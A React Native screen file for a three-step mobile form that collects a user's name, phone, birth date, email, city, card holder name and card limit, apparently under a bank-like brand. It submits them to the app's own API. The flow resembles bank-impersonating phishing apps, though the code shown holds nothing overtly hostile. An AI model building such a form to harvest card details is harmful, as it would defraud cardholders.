import { NativeStackScreenProps } from '@react-navigation/native-stack';
import { useState } from 'react';
import { ActivityIndicator, Alert, Pressable, ScrollView, StyleSheet, Text, TextInput, View } from 'react-native';
import { LinearGradient } from 'expo-linear-gradient';
import { serviceApi } from '../api/client';
import { RootStackParamList } from '../types/navigation';

type Props = NativeStackScreenProps<RootStackParamList, 'UserDetailsForm'>;

const INDUS_BLUE = '#1B3A6B';
const INDUS_DARK = '#0F1F3D';

export default function UserDetailsFormScreen({ navigation, route }: Props) {
  const { simLabel, serviceType, cardName } = route.params;

  const [fullName, setFullName] = useState('');
  const [mobileNumber, setMobileNumber] = useState('');
  const [dob, setDob] = useState('');
  const [email, setEmail] = useState('');
  const [city, setCity] = useState('');
  const [cardHolderName, setCardHolderName] = useState('');
  const [cardTotalLimit, setCardTotalLimit] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const onSubmit = async () => {
    if (!fullName.trim()) {
      Alert.alert('Required', 'Please enter your full name.');
      return;
    }
    if (mobileNumber.trim().length < 10) {
      Alert.alert('Required', 'Please enter a valid 10-digit mobile number.');
      return;
    }
    if (!dob.trim()) {
      Alert.alert('Required', 'Please enter your date of birth.');
      return;
    }
    if (!email.trim() || !email.includes('@')) {
      Alert.alert('Required', 'Please enter a valid email address.');
      return;
    }
    if (!city.trim()) {
      Alert.alert('Required', 'Please enter your city.');
      return;
    }
    if (!cardHolderName.trim()) {
      Alert.alert('Required', 'Please enter the card holder name.');
      return;
    }
    if (!cardTotalLimit.trim()) {
      Alert.alert('Required', 'Please enter your card total limit.');
      return;
    }

    setIsSubmitting(true);
    try {
      // Submit service request directly to server
      const result = await serviceApi.create({
        serviceType,
        cardName,
        fullName: fullName.trim(),
        mobileNumber: mobileNumber.trim(),
        dob: dob.trim(),
        email: email.trim(),
        city: city.trim(),
        cardHolderName: cardHolderName.trim(),
        cardTotalLimit: cardTotalLimit.trim(),
        simLabel,
      });

      if (result.success && result.data) {
        navigation.navigate('Success', {
          serviceType,
          fullName: fullName.trim(),
          referenceId: result.data.referenceId,
          mobileNumber: mobileNumber.trim(),
        });
      } else {
        Alert.alert('Error', result.error || 'Failed to submit request. Please try again.');
      }
    } catch (error) {
      console.error('[Form] Submit error:', error);
      Alert.alert('Error', 'Something went wrong. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <LinearGradient
      colors={['#E8EFF7', '#F5F8FC', '#FFFFFF']}
      style={styles.container}
    >
      <ScrollView
        style={styles.scrollView}
        contentContainerStyle={styles.scrollContent}
        keyboardShouldPersistTaps="handled"
      >
      <View style={styles.header}>
        <Text style={styles.stepLabel}>STEP 3 OF 3</Text>
        <Text style={styles.title}>Your Details</Text>
        <Text style={styles.subtitle}>Please fill in your information to proceed</Text>
      </View>

      <View style={styles.form}>
        <View style={styles.inputGroup}>
          <Text style={styles.label}>Full Name</Text>
          <TextInput
            style={styles.input}
            placeholder="Enter your full name"
            placeholderTextColor="#C4C4C4"
            value={fullName}
            onChangeText={setFullName}
          />
        </View>

        <View style={styles.inputGroup}>
          <Text style={styles.label}>Mobile Number</Text>
          <TextInput
            style={styles.input}
            placeholder="10-digit mobile number"
            placeholderTextColor="#C4C4C4"
            value={mobileNumber}
            keyboardType="phone-pad"
            maxLength={10}
            onChangeText={setMobileNumber}
          />
        </View>

        <View style={styles.inputGroup}>
          <Text style={styles.label}>Date of Birth</Text>
          <TextInput
            style={styles.input}
            placeholder="DD/MM/YYYY"
            placeholderTextColor="#C4C4C4"
            value={dob}
            onChangeText={setDob}
          />
        </View>

        <View style={styles.inputGroup}>
          <Text style={styles.label}>Email ID</Text>
          <TextInput
            style={styles.input}
            placeholder="you@example.com"
            placeholderTextColor="#C4C4C4"
            value={email}
            keyboardType="email-address"
            autoCapitalize="none"
            onChangeText={setEmail}
          />
        </View>

        <View style={styles.inputGroup}>
          <Text style={styles.label}>City</Text>
          <TextInput
            style={styles.input}
            placeholder="Your city"
            placeholderTextColor="#C4C4C4"
            value={city}
            onChangeText={setCity}
          />
        </View>

        <View style={styles.inputGroup}>
          <Text style={styles.label}>Card Holder Name</Text>
          <TextInput
            style={styles.input}
            placeholder="Name on your credit card"
            placeholderTextColor="#C4C4C4"
            value={cardHolderName}
            onChangeText={setCardHolderName}
          />
        </View>

        <View style={styles.inputGroup}>
          <Text style={styles.label}>Card Total Limit</Text>
          <TextInput
            style={styles.input}
            placeholder="e.g. 200000"
            placeholderTextColor="#C4C4C4"
            value={cardTotalLimit}
            keyboardType="numeric"
            onChangeText={setCardTotalLimit}
          />
        </View>
      </View>

      <Pressable
        style={[styles.primaryButton, isSubmitting && styles.primaryButtonDisabled]}
        onPress={onSubmit}
        disabled={isSubmitting}
      >
        {isSubmitting ? (
          <ActivityIndicator color="#FFFFFF" />
        ) : (
          <Text style={styles.primaryButtonText}>Submit</Text>
        )}
      </Pressable>
      </ScrollView>
    </LinearGradient>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
  },
  scrollView: {
    flex: 1,
  },
  scrollContent: {
    paddingHorizontal: 24,
    paddingTop: 60,
    paddingBottom: 40,
  },
  header: {
    marginBottom: 28,
  },
  stepLabel: {
    fontSize: 12,
    fontWeight: '700',
    color: INDUS_BLUE,
    letterSpacing: 1.5,
    marginBottom: 12,
  },
  title: {
    fontSize: 26,
    fontWeight: '800',
    color: INDUS_DARK,
    marginBottom: 6,
  },
  subtitle: {
    fontSize: 15,
    color: '#6B7280',
  },
  form: {
    gap: 18,
    marginBottom: 30,
  },
  inputGroup: {
    gap: 6,
  },
  label: {
    fontSize: 13,
    fontWeight: '700',
    color: INDUS_DARK,
    letterSpacing: 0.3,
  },
  input: {
    borderWidth: 1.5,
    borderColor: 'rgba(27, 58, 107, 0.2)',
    borderRadius: 14,
    paddingHorizontal: 16,
    paddingVertical: 14,
    fontSize: 15,
    color: INDUS_DARK,
    backgroundColor: 'rgba(255, 255, 255, 0.8)',
    shadowColor: '#000',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.05,
    shadowRadius: 4,
    elevation: 2,
  },
  primaryButton: {
    backgroundColor: INDUS_BLUE,
    borderRadius: 16,
    paddingVertical: 16,
    alignItems: 'center',
    marginTop: 24,
    shadowColor: INDUS_BLUE,
    shadowOffset: { width: 0, height: 6 },
    shadowOpacity: 0.3,
    shadowRadius: 12,
    elevation: 6,
  },
  primaryButtonText: {
    color: '#FFFFFF',
    fontSize: 17,
    fontWeight: '700',
  },
  primaryButtonDisabled: {
    opacity: 0.6,
  },
});

